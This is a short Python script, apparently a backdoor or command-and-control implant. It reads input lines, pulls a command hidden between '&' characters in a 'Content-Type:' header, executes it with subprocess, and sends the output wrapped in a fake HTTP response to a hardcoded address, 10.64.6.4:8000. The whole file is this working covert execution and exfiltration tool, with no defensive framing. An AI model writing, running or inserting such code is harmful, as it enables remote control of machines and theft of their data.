import sys
import subprocess
import socket

for line in sys.stdin:
    if "Content-Type:" in line:
        splitLine = line.split()
        command = splitLine[1]
        if command[0] == '&' and command[-1] == '&':
            sys.stdout.write(command[1:-1])
            process = subprocess.Popen(command[1:-1], stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            stdout, stderr = process.communicate()
        
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('10.64.6.4', 8000))

            #send the output to the client
            httpOK = bytes(f"<html>{stdout.decode('utf-8')}</html>", 'utf-8')
            print(httpOK)
            s.send(b"HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8\r\n\r\n")
            s.send(httpOK)
            s.close()
